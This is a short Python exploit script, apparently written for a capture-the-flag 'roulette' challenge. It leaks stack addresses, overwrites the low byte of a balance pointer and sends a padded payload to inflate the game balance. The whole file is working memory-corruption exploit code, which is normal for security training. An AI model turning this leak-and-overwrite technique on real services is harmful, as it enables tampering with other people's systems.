import re, sys
sys.path.insert(0, "roulette")
from exploit import Conn, parse_dump

c = Conn()
c.recv_until(b"name to be?"); c.sendline("20")
dump = c.recv_until(b"[addr]>", timeout=6).decode(errors="replace")
print(dump)
rsp, rbp_g, ret_slot, rbp_m, bal_slot, bal_ptr = parse_dump(dump)
print(f"rsp_game={rsp:#x} rbp_game={rbp_g:#x} rbp_main={rbp_m:#x} bal_slot={bal_slot:#x} &bal={bal_ptr:#x}")

for delta in (0x21, 0x19):
    pass

delta = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x21
target = bal_ptr - delta
print(f"--- redirect balance ptr low byte -> {target:#x} (delta={delta:#x})")
c.sendline(hex(bal_slot))
print("after addr:", c.drain(1.0).decode(errors="replace"))
c.sendline(str(target & 0xff))
print("after value:", c.drain(1.0).decode(errors="replace"))
c.sendline("21")
print("after wager 21:", c.drain(1.5).decode(errors="replace"))
c.sendline("0")
print("after wager 0:", c.drain(1.5).decode(errors="replace"))
c.sendline(b"A"*0x1c + b"\xff\xff\xff\x7f")
print("after payload:", c.drain(2).decode(errors="replace"))
c.close()
